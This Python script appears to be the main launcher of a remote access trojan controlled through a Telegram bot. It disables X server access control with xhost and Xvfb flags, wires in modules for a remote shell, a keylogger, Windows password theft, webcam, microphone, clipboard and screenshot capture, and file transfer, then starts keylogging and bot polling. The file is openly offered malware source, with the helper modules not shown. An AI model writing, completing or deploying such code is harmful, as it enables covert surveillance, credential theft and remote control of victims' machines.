import asyncio
import logging
import os
import subprocess
import time
import socket

# Get the absolute path of the script's directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(BASE_DIR, 'logs')
LOG_FILE = os.path.join(LOG_DIR, 'bot.log')

# Create logs directory if it doesn't exist
os.makedirs(LOG_DIR, exist_ok=True)

# Configure logging with absolute path
logging.basicConfig(level=logging.INFO, filename=LOG_FILE,
                    format="%(filename)s:%(lineno)d #%(levelname)-8s" "[%(asctime)s] - %(name)s - %(message)s")


def check_display_access(display):
    """Check if the display is accessible."""
    try:
        # Try to run a simple X command to test access
        subprocess.run(['xset', '-display', display, 'q'], check=True, capture_output=True, timeout=5)
        logging.info(f"Display {display} is accessible")
        return True
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError) as e:
        logging.warning(f"Display {display} is not accessible: {e}")
        return False


def grant_xhost_access():
    """Grant access to the local X server using xhost."""
    try:
        subprocess.run(['xhost', '+local:'], check=True, capture_output=True)
        logging.info("Granted local access to X server via xhost")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to grant xhost access: {e}")


def find_free_display(start=99, max_tries=10):
    """Find an available display number for Xvfb."""
    for i in range(start, start + max_tries):
        display = f":{i}"
        lock_file = f"/tmp/.X{i}-lock"
        if not os.path.exists(lock_file):
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                s.connect(f"/tmp/.X11-unix/X{i}")
                s.close()
                continue
            except (ConnectionRefusedError, FileNotFoundError):
                return display
    raise RuntimeError("No free display found")


def setup_xvfb():
    """Start Xvfb and set DISPLAY environment variable if needed."""
    current_display = os.environ.get('DISPLAY', ':0')

    # First, try to use the current display
    if check_display_access(current_display):
        logging.info(f"Using existing display {current_display}")
        os.environ['DISPLAY'] = current_display
        return

    # Try granting access to the current display
    logging.info(f"Attempting to grant access to {current_display}")
    grant_xhost_access()
    if check_display_access(current_display):
        logging.info(f"Using display {current_display} after granting access")
        os.environ['DISPLAY'] = current_display
        return

    # Fallback to Xvfb
    logging.info(f"Existing display {current_display} unavailable, starting Xvfb")
    try:
        display = find_free_display()
        logging.info(f"Selected display {display} for Xvfb")

        # Start Xvfb
        logging.info(f"Starting Xvfb on display {display}")
        xvfb_process = subprocess.Popen(
            ['Xvfb', display, '-screen', '0', '1024x768x16', '-ac'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        time.sleep(2)  # Wait for Xvfb to initialize

        # Check if Xvfb is running
        if xvfb_process.poll() is not None:
            stderr = xvfb_process.stderr.read().decode()
            raise RuntimeError(f"Xvfb failed to start: {stderr}")

        os.environ['DISPLAY'] = display
        logging.info(f"Xvfb started successfully on {display}")
    except Exception as e:
        logging.error(f"Failed to setup Xvfb: {e}")
        raise


# Setup Xvfb or existing display before importing modules that use pynput
logging.info("Setting up display")
try:
    setup_xvfb()
except Exception as e:
    logging.error(f"Display setup failed: {e}")
    print(f"Display setup failed: {e}")
    exit(1)

# Import modules after setting DISPLAY
from aiogram import Dispatcher, types
from helpers import ip_addr, ps, screenshot, shell, sys_info, up_down, webcam, handlers, file_man, mic, clipboard, \
    win_passwords, keylogger
from cfg import bot as bot

# Author : Exited3n
# https://t.me/wh_lab

dp = Dispatcher()

# Append routers
logging.info("Including routers")
dp.include_router(handlers.router)
dp.include_router(sys_info.router)
dp.include_router(screenshot.router)
dp.include_router(ip_addr.router)
dp.include_router(up_down.router)
dp.include_router(shell.router)
dp.include_router(ps.router)
dp.include_router(webcam.router)
dp.include_router(file_man.router)
dp.include_router(mic.router)
dp.include_router(clipboard.router)
dp.include_router(win_passwords.router)
dp.include_router(keylogger.router)
logging.info("All routers included")


@dp.errors()
async def errors_handler(update: types.Update, exception: Exception):
    logging.error(f'❌ Error: {update}: {exception}')


async def main():
    try:
        logging.info("Starting keylogger setup")
        keylogger.setup_keylogger()
        logging.info("Starting bot polling")
        await dp.start_polling(bot)
    except (KeyboardInterrupt, SystemExit):
        logging.info("Bot stopped")
    finally:
        await bot.session.close()


if __name__ == "__main__":
    logging.info('Bot starting...')
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        print('⛔️ Bot stopped by Ctrl + C')
        logging.info('⛔️ Bot stopped by Ctrl + C')
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        print(f"Fatal error: {e}")
